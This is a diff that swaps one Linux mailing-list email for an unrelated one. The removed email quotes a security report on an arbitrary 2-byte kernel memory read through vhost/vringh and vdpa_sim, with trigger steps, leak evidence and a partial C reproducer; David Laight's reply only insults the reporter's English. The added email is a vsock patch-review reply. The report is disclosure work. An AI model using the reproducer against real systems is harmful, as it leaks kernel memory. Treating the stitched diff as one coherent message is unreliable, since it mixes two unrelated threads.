@@ -1,568 +1,357 @@
-Received: from mail-wm1-f44.google.com (mail-wm1-f44.google.com [209.85.128.44])
+Received: from mail-qk1-f172.google.com (mail-qk1-f172.google.com [209.85.222.172])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3B2BB3EEAEA
-	for <virtualization@lists.linux.dev>; Sat, 17 Oct 2026 21:59:11 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.44
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1792274358; cv=none; b=Ejoe+BLLUuvhasccDmSw83vkNuhfF6Qm+CgVodgaiLzha3AEP7AEQ/8m6E5xhXHStzR4g2y8Tj0jn/tRBhmPqsIeCusl+sHuYqfUDatlQPNpQLLvb7Jm6gfDWds75v1c0nKa+lz+EmXjj3TP7eS+CTlqPbRC+5vvv77lKQN+1IE=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1792274358; c=relaxed/simple;
-	bh=6IjtD6adoP4ku7tKJGZ98RNr8Al6oPNzHXUHVkSctqY=;
-	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=Ayt9uV8SrZYut7C+bclKdU43QMTnEbDAZEtpQJFA80HhyjnMr3zm7GMhYVWOUU+GXdwB89aboIz1Xkzex+zs8n5Gmixc44ZdytxpLSeNtFAKgmvy6aNc/MOlyphjO5ui2ZxrrNsNNHeUvldrbzEjoIhIy+izqZfm0mWtbZS30C0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=BpPPr6qf; arc=none smtp.client-ip=209.85.128.44
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 61C16418361
+	for <virtualization@lists.linux.dev>; Sun, 18 Oct 2026 04:43:08 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.222.172
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1792298592; cv=pass; b=OsDO8aLOqOpohCG6y37PSL50wjh4w6pedWueucxpDsMWfcYjM0m32aPiyuE/7NHOeh3LcUDMYWUkKeN6WL0n5bX/hKdH0QMF/va5/uh3e+/H0jHzmiooFNmHrudOcNc6wvurKh2mzSP69hnuZ6nFhUOI2o0aWaTHpz9X1aXtBTA=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1792298592; c=relaxed/simple;
+	bh=DHpt0emLBDEXhg01inCWP8u2BhRmbxlc7aC04HKyBeE=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=moXoR8Q2FrgVdNVXCKEkW5t62Odt2VAOit6FmGs9sf64/nur0lpClBj7xrpD291/csBF/+qgNNYbtiraoZCoyqDBV8ITqSQGvC4f3FTHPt09NUWaYxAXKcVBNPSn9qL7vFP+GGesUi83wuDczdAmFY35krDbyZJA6rKlIpPsASk=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ks2p7gnH; arc=pass smtp.client-ip=209.85.222.172
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="BpPPr6qf"
-Received: by mail-wm1-f44.google.com with SMTP id 5b1f17b1804b1-4a018dc1f98so6922225e9.3
-        for <virtualization@lists.linux.dev>; Sat, 17 Oct 2026 14:59:11 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ks2p7gnH"
+Received: by mail-qk1-f172.google.com with SMTP id af79cd13be357-93e64d52949so111289685a.1
+        for <virtualization@lists.linux.dev>; Sat, 17 Oct 2026 21:43:08 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1792298587; cv=none;
+        d=google.com; s=arc-20260327;
+        b=QYbA5JJmNhlfRgeL+Kz4QGfi+Ri2lTBlf1huMM7on4RUzK8ty5xE0H+PBJhO5EDpji
+         oXj7QV4FTluTCdHf1pWapPw8zABrNuYVOt0FA3o88OfcHHpQRcGc/AG23KoT+3D7VxD+
+         UmPpI6LcHTqcCthaVbV46p8+TB7/CM5FkoSPTmwZhv7G5KTm/+ZybkwJaG9GgkDKi3n5
+         RJEIScCuwkabDEis84zQA/hsEvCkq12ps8qLy2xfjkBXKm9lFedUJkH7q7E2SFjEV0+z
+         xbOQPN2ePSyccJU/vPrpyYJrRx939tv66Ts3yAz6HV1e8gkL/3HTHNwzdYB3QoAaRBUH
+         5vIg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=cc:to:subject:message-id:date:from:in-reply-to:references
+         :mime-version:dkim-signature;
+        bh=TCd4vJVysPs+rmx1m3RvczNkQ2iSpfMjw8JApMQr1io=;
+        fh=R+bXBvT2ry9ij4NeFiempa1ed3f5lC7/ZMR3ybYOFXw=;
+        b=roAf3w8JHNCcizrECu8Tt7DzZgqn55xTJCZyhcU/U84nBJI4PKwfcUHPZQlCkAqkKy
+         w4unQ7Aj7N+KIjer2+zIMnvKJ9s+YQgtj7cQWL0qDN/0lX3wfmMw0fScbHzwcDiUw+gc
+         esY8VuQXu8WQW+isBTBzHcEMzHrsKTZLHE0J60Ix07yMQd4ZgmrklGwmgDb4PeLxPcBX
+         hjmqwgZi0ViAAj4gvXEZz4X5DK6JRBuwmuEyeF8Z9Z1rk9ZYvZGdErjb0YbcreUGl7Su
+         nEYFaUDhOzDRlZYO99/Q9rgGjSzfcuZoUoQauDSmJ18SXHl7qP3sKtiGWWAu6om8cERy
+         p2vg==;
+        darn=lists.linux.dev
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1792274349; x=1792879149; darn=lists.linux.dev;
-        h=content-transfer-encoding:content-type:mime-version:references
-         :in-reply-to:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=i4QQ58GJDAGLapBNzE/pzEET3TfiHm0dhF60oG0Wdrk=;
-        b=BpPPr6qfJ9xsojorwzxNoeR9OhFwfl3IC05bEUiBEg++yFqhAYTIg5VFBYwJFspl0K
-         7pXLc1QS8qvw8/lL7dv8trcwvzw/7KnYleyhjHaI+4EerCzVRNmr0wTTI+fDnpM9vkjq
-         yxfcS7ubquxJ7kZcjqPIjOUUkCww5Crv3opna0+9/voq6UE2aNMqHvGEonEkBcSqByiK
-         2rqtgYyxsRj9qAagot7wBtryksj+5LmY3dBalaTCCRKh6ayKYkpbiFP2UOEv/N/VlZRt
-         TeCQ8ib5P06a711vnb5BtKATsHbP15xW3YG8cSreINMpCHXOpJbmsMES4h5uzx4XWQbT
-         oL6g==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1792274349; x=1792879149;
-        h=content-transfer-encoding:content-type:mime-version:references
-         :in-reply-to:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+        d=gmail.com; s=20251104; t=1792298587; x=1792903387; darn=lists.linux.dev;
+        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
+         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
          :content-type;
-        bh=i4QQ58GJDAGLapBNzE/pzEET3TfiHm0dhF60oG0Wdrk=;
-        b=M2zUfncQA8DlFFYqEpWmq5JRDc+0Zy94lGZ6EUvHyWIpy3P1HX7UJ0MlGIhWf5ahpF
-         jD7r/N96fcMoM8+cDsY5q78tip+gzsVlIYZbcOCODpw7Gfm2+7jDXDPeMz06GHdrL8na
-         +Kjo7SRhbRRdFtaU1r9Li5k+mpmvUwL2ayUrI+FEbbewXvv94C84KIDcmfS4CCs+LBqf
-         AeJKWwSY9kcahU0z0IJN/gZvIY0oE50A+zFPEdQAm6inCaHIM7FWoEfqtQvuhjt5L4Dc
-         vooqaeC1EpR5WL1XmBa2e54XfH/g5sqBn4qEFv/69Bq2SvMsCaAeruCmfHA/P/AFPDIE
-         tILw==
-X-Forwarded-Encrypted: i=1; AKwUvByvuXmCms0vZK9gl6+nmKdO1gG4mvhn1G/TqymPJYJr7pnsEciUZAiAgbUf2Yq6iMTp3k7+4/VlaH5Si6LVwA==@lists.linux.dev
-X-Gm-Message-State: AFq9FYKt+qTqd18/JFVbUH7za9AjkD1/YLWGq83e1DNLu6xF4LRgXloM
-	cnDPrNfxe5nS3sl8mpcR1Tub81tmKpJ0WQho8UDgV0Hrb//RzDbUJJw3
-X-Gm-Gg: AYBFou2ntxdniMmBOzKyxXU88dyK8ycWPhkpngXHGNGcpbktvQlZyPYL9E2J6XhK1yg
-	VAKfNSggHWGYFX0H5sAjQS+RlBYNWr0mwJtY6XyCiVb9x3JFsToOEFNF7L66md84ndYSsRwzg0H
-	aCYxAtN6HJFAm8+DaFa9RoWOULRfg6zW8CP9oZK7ZVlmFtmD14+gIYOafCflHsEhvdY/itPmIhw
-	4KKAkYxo0EvFwKrus5KoQ+pYVe7s91FM2mTEkrDXJI1rMqCzdSv8rPSV9mV/GXibzO2OPP9x9L6
-	fTnTGaehjZ97am2GD9qNjTXHRiL8SaubiBsHkd+mXuHz0Nvxp7/VI0esraTGuNi6RHMq9sCXLVg
-	VeEluUnidrRln2si6olrPbeGdQINhest4gSMHuMYxbBjZ19qM06ASM3rlffAo+tli6dPascAaLQ
-	v8pmhgHsnxML3IVmyysLIzo9Sf4Ajds21xwRcR+XhpXQb1YoG5QhG0acsI2pOj9PusGHHPBrVep
-	lSEDfrY0DyqOnVdpqqlrF4ulMK+A3UsyX4=
-X-Received: by 2002:a05:600c:8b6f:b0:4a1:ce33:1536 with SMTP id 5b1f17b1804b1-4a1d75e37ecmr62071105e9.9.1792274349408;
-        Sat, 17 Oct 2026 14:59:09 -0700 (PDT)
-Received: from pumpkin (82-69-66-36.dsl.in-addr.zen.co.uk. [82.69.66.36])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-4a1bd91c55bsm219440545e9.0.2026.10.17.14.59.08
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 17 Oct 2026 14:59:08 -0700 (PDT)
-Date: Sat, 17 Oct 2026 22:59:07 +0100
-From: David Laight <david.laight.linux@gmail.com>
-To: Haoran Wang <haoranwangsec@gmail.com>
-Cc: mst@redhat.com, jasowangio@gmail.com, kvm@vger.kernel.org,
- virtualization@lists.linux.dev, netdev@vger.kernel.org,
- eperezma@redhat.com, linux-kernel@vger.kernel.org, security@kernel.org
-Subject: Re: [BUG] vhost/vringh: __get_user without access_ok leaks kernel
- memory via vDPA passthrough
-Message-ID: <20261017225907.591bc0a1@pumpkin>
-In-Reply-To: <6ad07f8a.a0c71a5e.2d2efd.977a@mx.google.com>
-References: <6ad07f8a.a0c71a5e.2d2efd.977a@mx.google.com>
-X-Mailer: Claws Mail 4.1.1 (GTK 3.24.38; arm-unknown-linux-gnueabihf)
+        bh=TCd4vJVysPs+rmx1m3RvczNkQ2iSpfMjw8JApMQr1io=;
+        b=ks2p7gnHGh8rA0GqGRXge7z6GFRH5meh47lfW99Irfm0Ygu+D2wj/sd6/uiNFUpUYM
+         jPnd8g5xYKhfk05almZHYvdXRL+mNDjPhPA6EqnIRZntBkluTuJJ3WmmaomV6mY4OsBb
+         EKedX5W0ZA2oUDazdBS9goLGFO26kdlaqXnUKmpvMMjhWR5hKsnzmiymxxZIBroUdL26
+         JXlZLyC1YxHQA5iNABzxAOWgnzDlBQQQijpilO6FwJgjVDvWryt+HyPvH3NA6NmMfOxT
+         f2PRUKK87pkqilsSfn3anWu9ymmQnXVZmydH/GmX0buX+7FVr7PGY7w6x70fkxfAfyfs
+         tXjg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1792298587; x=1792903387;
+        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
+         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to:content-type;
+        bh=TCd4vJVysPs+rmx1m3RvczNkQ2iSpfMjw8JApMQr1io=;
+        b=jdyW6ZbeseQtIbXo6djBiHtiHW9GhYWVeSfsiu+GM5Ap6XCB5ImAf/8sHeePUSu+pp
+         qpVv+mewn4mhcbAw/HC+POSryJr7tbe5QE0pO0rZxGhazOcYTDrflAtwVnMcF95F57Um
+         pT7tplnk3jXjvz2HX4c3Mtm2R9X7bxODnyN+L3ZE06WeOvQNtjSvzcjYzum7TCkHzHdt
+         8r9RbmE51yl1fwyyKxof5qhk3RLbXzu3zKnQjWkylZwvwMwaH2cTOXP6CNmG8W1MaRqS
+         bsMYzNKLrZXkeugVY/EzpPwSlRqD1GX2S3OKF2xDOP4Ks6bGswx/K0bpcIr1ysk8ggrp
+         pBSg==
+X-Forwarded-Encrypted: i=1; AKwUvBzTtbqafqAbZcmajVCzZkewLhWR6Sv6Y022AsxbMqQ2WzQmT7Q2Zh+nSOV4yHvZVK0XOeIdr8K7KvCvpugJJg==@lists.linux.dev
+X-Gm-Message-State: AFq9FYKiic2yXPjas6u9SpEZZO1pUcQ0fzZtMudSSqqI2KD1uxoVFYId
+	3RbOk9XqjEaiQe8b/P4jh//X1DrrAT0U0m+Gs8xVxYi29cshvu/Kxh6ryE/aLGqU17ejDX10GJD
+	Vj/qvX92Biycrel7sUod8AAikUc4hQZY=
+X-Gm-Gg: AYBFou0L17vvFY+Sq4UmbdOHUNYWQ9Al7fzrk3aMQ8BmTbexlVM3D883rzKPyoBYNLO
+	sCW7d8ohqS8ru3jjcCAwXzk5/EADG3LMbM5YXhNTN0ZAJThfRcE0ArT0cD7NUJbK0mexCw/TnQM
+	p7GO1K558SbAsvxGYzUunzVKoFoq3yGedZ3B7jhu4aXtXeruzKJgKVpDrVaqTKumCdGtQiQ/R2U
+	tmqEUkb5Nkg55RwGuWAyEnoCwkyRiTBnlqpUhxEs/KAav1ftPDed88JPwHeYjABlboYnL1p+zXk
+	zp3/0G2f0LhC99bdKf/CUTcCF6plKr8gSYCeWRnvpJhM1lgKBp33I58=
+X-Received: by 2002:a05:620a:260a:b0:93c:b6db:8c with SMTP id
+ af79cd13be357-93f299f3829mr676090985a.0.1792298586112; Sat, 17 Oct 2026
+ 21:43:06 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: virtualization@lists.linux.dev
 List-Id: <virtualization.lists.linux.dev>
 List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 7bit
+References: <20261014115640.184286-1-physicalmtea@gmail.com>
+ <20261014115640.184286-2-physicalmtea@gmail.com> <atImp74JbTbEb0d_@sgarzare-redhat>
+In-Reply-To: <atImp74JbTbEb0d_@sgarzare-redhat>
+From: Jia Jia <physicalmtea@gmail.com>
+Date: Sun, 18 Oct 2026 12:42:29 +0800
+X-Gm-Features: AclHuK8Ob-l6fq4mltZ_vIa4jBsMb_PwAPuMxfSzbBTGRIF1RfJPYptCeSCMlpA
+Message-ID: <CAJwVaML2F6vN5xGsmvd1PwD3ToLOeV_PfzJrArvan8gvbveKuA@mail.gmail.com>
+Subject: Re: [PATCH net-next v4 1/4] vsock/virtio: split socket lookup from
+ locked RX processing
+To: Stefano Garzarella <sgarzare@redhat.com>
+Cc: stefanha@redhat.com, mst@redhat.com, jasowangio@gmail.com, 
+	eperezma@redhat.com, xuanzhuo@linux.alibaba.com, davem@davemloft.net, 
+	edumazet@kernel.org, kuba@kernel.org, pabeni@redhat.com, horms@kernel.org, 
+	virtualization@lists.linux.dev, kvm@vger.kernel.org, netdev@vger.kernel.org, 
+	linux-kernel@vger.kernel.org, bobbyeshleman@gmail.com
+Content-Type: text/plain; charset="UTF-8"
 
-On Thu, 15 Oct 2026 15:23:45 +0800
-Haoran Wang <haoranwangsec@gmail.com> wrote:
+>
+> On Wed, Oct 14, 2026 at 07:56:37PM +0800, Jia Jia wrote:
+> >Split virtio_transport_recv_pkt() so socket lookup is separate from
+> >receive state machine processing under the socket lock. This prepares the
+> >receive path to keep a looked-up socket across multiple packets in a later
+> >change.
+> >
+> >Keep virtio_transport_recv_pkt() on its existing per-packet locking path.
+> >The locked helper obtains packet-specific addresses from the skb and uses
+> >the matched socket namespace for reset replies. Preserve source validation
+> >and failure handling.
+> >
+> >No functional change intended.
+> >
+> >Signed-off-by: Jia Jia <physicalmtea@gmail.com>
+> >---
+> > net/vmw_vsock/virtio_transport_common.c | 128 ++++++++++++++----------
+> > 1 file changed, 75 insertions(+), 53 deletions(-)
+> >
+> >diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
+> >index f225f53ed4bab..61ee3bc205d5d 100644
+> >--- a/net/vmw_vsock/virtio_transport_common.c
+> >+++ b/net/vmw_vsock/virtio_transport_common.c
+> >@@ -1774,81 +1774,60 @@ static bool virtio_transport_valid_type(u16 type)
+> >              (type == VIRTIO_VSOCK_TYPE_SEQPACKET);
+> > }
+> >
+> >-/* We are under the virtio-vsock's vsock->rx_lock or vhost-vsock's vq->mutex
+> >- * lock.
+> >- */
+> >-void virtio_transport_recv_pkt(struct virtio_transport *t,
+> >-                             struct sk_buff *skb, struct net *net)
+> >+static struct sock *
+> >+virtio_transport_find_socket(struct sk_buff *skb, struct sockaddr_vm *src,
+> >+                           struct sockaddr_vm *dst, struct net *net)
+> > {
+> >       struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
+> >-      struct sockaddr_vm src, dst;
+> >-      struct vsock_sock *vsk;
+> >       struct sock *sk;
+> >-      bool space_available;
+> >-
+> >-      vsock_addr_init(&src, le64_to_cpu(hdr->src_cid),
+> >-                      le32_to_cpu(hdr->src_port));
+> >-      vsock_addr_init(&dst, le64_to_cpu(hdr->dst_cid),
+> >-                      le32_to_cpu(hdr->dst_port));
+> >-
+> >-      trace_virtio_transport_recv_pkt(src.svm_cid, src.svm_port,
+> >-                                      dst.svm_cid, dst.svm_port,
+> >-                                      le32_to_cpu(hdr->len),
+> >-                                      le16_to_cpu(hdr->type),
+> >-                                      le16_to_cpu(hdr->op),
+> >-                                      le32_to_cpu(hdr->flags),
+> >-                                      le32_to_cpu(hdr->buf_alloc),
+> >-                                      le32_to_cpu(hdr->fwd_cnt));
+> >
+> >-      if (!virtio_transport_valid_type(le16_to_cpu(hdr->type))) {
+> >-              (void)virtio_transport_reset_no_sock(t, skb, net);
+> >-              goto free_pkt;
+> >-      }
+> >+      if (!virtio_transport_valid_type(le16_to_cpu(hdr->type)))
+> >+              return NULL;
+> >
+> >-      /* The socket must be in connected or bound table
+> >-       * otherwise send reset back
+> >-       */
+> >-      sk = vsock_find_connected_socket_net(&src, &dst, net);
+> >-      if (!sk) {
+> >-              sk = vsock_find_bound_socket_net(&dst, net);
+> >-              if (!sk) {
+> >-                      (void)virtio_transport_reset_no_sock(t, skb, net);
+> >-                      goto free_pkt;
+> >-              }
+> >-      }
+> >+      sk = vsock_find_connected_socket_net(src, dst, net);
+> >+      if (!sk)
+> >+              sk = vsock_find_bound_socket_net(dst, net);
+> >+      if (!sk)
+> >+              return NULL;
+> >
+> >       if (virtio_transport_get_type(sk) != le16_to_cpu(hdr->type)) {
+> >-              (void)virtio_transport_reset_no_sock(t, skb, net);
+> >               sock_put(sk);
+> >-              goto free_pkt;
+> >+              return NULL;
+> >       }
+> >
+> >-      if (!skb_set_owner_sk_safe(skb, sk)) {
+> >-              WARN_ONCE(1, "receiving vsock socket has sk_refcnt == 0\n");
+> >-              goto free_pkt;
+> >-      }
+> >+      return sk;
+> >+}
+> >
+> >-      vsk = vsock_sk(sk);
+> >+/*
+> >+ * The caller holds sk's socket lock and must free skb if this returns true.
+>
+> Why the skb must be freed by the caller and not by this function itself?
+>
 
-> I'd like to report an issue in drivers/vhost/vringh.c:1216 (function
-> getu16_iotlb), found via static analysis of Linux 7.0.11 and verified
-> against the 7.2.10 source tree. I have reproduced the leak on an
-> unmodified 7.2.10 kernel.
-> 
-> 1. Summary
-> getu16_iotlb() calls __get_user(tmp, (__virtio16 __user *)iov_base)
-> without an access_ok() check. iov_base originates from iotlb_translate(),
-> which only performs an IOTLB interval lookup (vhost_iotlb_itree_first) and
-> does not call access_ok(). In the vdpa_sim default passthrough mode the
-> entire address space is identity-mapped ([0, ULONG_MAX] -> 0), and
-> vdpasim_set_vq_address() stores the controller-supplied vring address
-> verbatim with no validation. A controller with CAP_NET_ADMIN can therefore
-> set a vring avail_user_addr to a kernel address. On a vq kick the vdpa_sim
-> worker reads 2 bytes from that kernel address via __get_user (no
-> access_ok). Each vring iteration reads 2 bytes and the value is
-> repeatable, yielding an arbitrary-kernel-address 2-byte read. get_user()
-> would have rejected a kernel address via access_ok(), while__get_user() does
-> not.
+You're right, it doesn't have to be. I originally left the skb cleanup
+to the caller so it could unwind either per-packet or batch state
+while preserving
+the existing error-path order (release_sock() -> drop the lookup
+reference -> kfree_skb()).
 
-Can 'YOU' write that in proper English?
-That is just horrid twaddle.
+However, that distinction does not require skb ownership to escape the
+helper, and the resulting ownership contract is confusing since the
+other paths
+consume the skb internally. I'll make the helper consume it directly in v5.
 
-David
 
-> 
-> 2. Vulnerable code
-> - File: drivers/vhost/vringh.c:1216 (unchanged in 7.2.10)
-> - Function: getu16_iotlb
-> - Misused API: __get_user
-> 
-> ```c
-> /* drivers/vhost/vringh.c:1216 - getu16_iotlb (IOTLB read helper, per vring iteration) */
-> if (vrh->use_va) {
->         ret = __get_user(tmp, (__virtio16 __user *)ivec.iov.iovec[0].iov_base); /* no access_ok */
-> }
-> 
-> /* iov_base comes from iotlb_translate() (IOTLB lookup only, no access_ok) */
-> /* drivers/vdpa/vdpa_sim/vdpa_sim.c:157-159 - passthrough identity-maps everything */
-> vhost_iotlb_add_range(&iommu, 0, ULONG_MAX, 0, VHOST_MAP_RW);
-> /* vdpa_sim.c:297 - set_vq_address stores the controller u64 verbatim, no validation */
-> vq->desc_addr = desc_area;   /* controller-controlled = kernel address */
-> ```
-> 
-> 3. Root cause
-> get_user() = access_ok() + __get_user(). __get_user() skips access_ok()
-> (it expands to __get_user_nocheck, which performs no check_range, whereas
-> get_user/put_user expand to the check_range-bearing variants that reject
-> kernel addresses). In the vhost-vdpa + vdpa_sim use_va path, the vring
-> addresses supplied by the controller (driver_addr/desc_addr) flow through
-> iotlb_translate(), which only does a vhost_iotlb_itree_first() interval
-> lookup. vdpa_sim's default passthrough IOTLB identity-maps the whole
-> address space, so any address passes the lookup. vdpasim_set_vq_address()
-> stores the controller's u64 with no user/kernel validation, and
-> vhost_vring_set_addr()'s access_ok is skipped in the vhost-vdpa path
-> because vq->private_data is never set. Consequently __get_user
-> dereferences an attacker-chosen kernel virtual address: the vdpa_sim
-> worker runs under kthread_use_mm() in the controller's mm with SMAP
-> disabled (STAC), and kernel addresses are mapped there, so 2 bytes of
-> kernel memory are read. With num=1, __vringh_get_head() sees head (the
-> leaked u16) >= 1 and calls vringh_bad(), which printk's the leaked value
-> to dmesg, making the leak externally observable.
-> 
-> 4. Affected versions
-> Present in: Linux 7.0.11. 7.2.10: still present, reproduced on 7.2.10 kernel.
-> 
-> 5. Trigger / Preconditions
-> CAP_NET_ADMIN + vdpa_sim (CONFIG_VDPA_SIM / VDPA_SIM_BLOCK) + use_va mode.
-> The controller creates a vdpasim device, binds its mm (VHOST_SET_OWNER,
-> enabling use_va), negotiates VIRTIO_F_ACCESS_PLATFORM, sets the vring
-> avail_user_addr to a kernel address, enables the vq, sets DRIVER_OK, and
-> kicks the vq. The worker then reads 2 bytes at the chosen kernel address.
-> 
-> 6. Proof of Concept
-> Reproduced on Linux 7.2.10 tarball (config-only: CONFIG_KASAN=y, VHOST_VDPA=y, 
-> VDPA_SIM=y, VDPA_SIM_BLOCK=y). The trigger sets avail_user_addr = &linux_banner 
-> and reads avail->ring[0] (at banner+4). With num=1, the leaked u16 is printk'd 
-> by vringh_bad().
-> 
-> Concrete reproduced evidence (7.2.10):
-> - dmesg: "vringh:" then "Guest says index 8312 > 1 is available"
-> - leaked value = 8312 = 0x2078 = linux_banner[4]='x'(0x78) |
->   (linux_banner[5]=' '(0x20) << 8)
-> - The expected value is independently computable from /proc/version (which
->   prints the same linux_banner): proc_version[4] | (proc_version[5] << 8)
->   = 0x78 | 0x2000 = 0x2078 = 8312. The reproduced value MATCHES.
-> - Across 3 boots the banner *address* changed under KASLR
->   (0xffffffff8b517280 / 0xffffffffa3f17280 / 0xffffffff90717280; the
->   trigger resolves it at runtime via /proc/kallsyms), while the leaked
->   *content* was 8312 every time. KASLR only randomizes the address, the 2
->   bytes read there are constant.
-> 
-> So a CAP_NET_ADMIN controller can read 2 bytes at an arbitrary kernel
-> virtual address by setting a vring avail_user_addr to that address and
-> kicking the vdpa_sim worker. The value is disclosed to dmesg via
-> vringh_bad(). This is an arbitrary-kernel-address 2-byte read on an
-> 7.2.10 kernel. 
-> 
-> Reproducer (vringh_leak.c) -- runs in the QEMU guest as root
-> (CAP_NET_ADMIN):
-> 
-> ```c
-> #define _GNU_SOURCE
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <unistd.h>
-> #include <fcntl.h>
-> #include <errno.h>
-> #include <stdint.h>
-> #include <sys/ioctl.h>
-> #include <sys/socket.h>
-> #include <sys/mman.h>
-> #include <linux/netlink.h>
-> #include <linux/genetlink.h>
-> #include <linux/vhost.h>
-> #include <linux/vdpa.h>
-> #include <sys/eventfd.h>
-> 
-> #ifndef VHOST_VDPA
-> #define VHOST_VDPA 0xAF
-> #endif
-> 
-> #ifndef VHOST_BACKEND_F_IOTLB_MSG_V2
-> #define VHOST_BACKEND_F_IOTLB_MSG_V2 0x1
-> #endif
-> #ifndef VHOST_BACKEND_F_IOTLB_BATCH
-> #define VHOST_BACKEND_F_IOTLB_BATCH 0x2
-> #endif
-> #ifndef VHOST_BACKEND_F_IOTLB_ASID
-> #define VHOST_BACKEND_F_IOTLB_ASID 0x3
-> #endif
-> #ifndef VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK
-> #define VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK 0x6
-> #endif
-> 
-> static inline int nla_ok_(const struct nlattr *nla, int remaining)
-> {
-> 	return remaining >= (int)sizeof(struct nlattr) &&
-> 	       nla->nla_len >= (int)sizeof(struct nlattr) &&
-> 	       nla->nla_len <= remaining;
-> }
-> static inline struct nlattr *nla_next_(const struct nlattr *nla, int *remaining)
-> {
-> 	int tot = (int)NLA_ALIGN(nla->nla_len);
-> 	*remaining -= tot;
-> 	return (struct nlattr *)((char *)nla + tot);
-> }
-> static inline void *nla_data_(const struct nlattr *nla)
-> {
-> 	return (char *)nla + NLA_HDRLEN;
-> }
-> 
-> #ifndef VDPA_GENL_NAME
-> #define VDPA_GENL_NAME "vdpa"
-> #endif
-> #ifndef VDPA_GENL_VERSION
-> #define VDPA_GENL_VERSION 1
-> #endif
-> #ifndef VDPA_CMD_DEV_NEW
-> #define VDPA_CMD_DEV_NEW 3
-> #endif
-> #ifndef VDPA_CMD_DEV_DEL
-> #define VDPA_CMD_DEV_DEL 4
-> #endif
-> #ifndef VDPA_ATTR_MGMTDEV_DEV_NAME
-> #define VDPA_ATTR_MGMTDEV_DEV_NAME 2
-> #endif
-> #ifndef VDPA_ATTR_DEV_NAME
-> #define VDPA_ATTR_DEV_NAME 4
-> #endif
-> 
-> #define die(fmt, ...) do { fprintf(stderr, "FATAL: " fmt "\n", ##__VA_ARGS__); exit(1); } while (0)
-> #define xp(fmt, ...) do { int _e = errno; fprintf(stderr, "ERR " fmt " (%s)\n", ##__VA_ARGS__, strerror(_e)); } while (0)
-> 
-> static int nlsock;
-> static __u32 nlseq = 0;
-> 
-> static int nla_put_str(struct nlmsghdr *nlh, int len, int type, const char *s)
-> {
-> 	struct nlattr { __u16 nla_len; __u16 nla_type; } *nla;
-> 	int sl = (int)strlen(s) + 1;
-> 	int pl = NLA_HDRLEN + sl;
-> 	int pad = NLA_ALIGN(sl) - sl;
-> 	if (NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl) > (size_t)len) return -1;
-> 	nla = (void *)nlh + NLMSG_ALIGN(nlh->nlmsg_len);
-> 	nla->nla_len = (__u16)pl;
-> 	nla->nla_type = (__u16)type;
-> 	memcpy((char *)nla + NLA_HDRLEN, s, sl);
-> 	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl);
-> 	(void)pad;
-> 	return 0;
-> }
-> 
-> static int genl_resolve_family(const char *name, __u16 *fam_id)
-> {
-> 	char buf[1024];
-> 	struct nlmsghdr *nlh = (void *)buf;
-> 	struct genlmsghdr *gh;
-> 	memset(buf, 0, sizeof(buf));
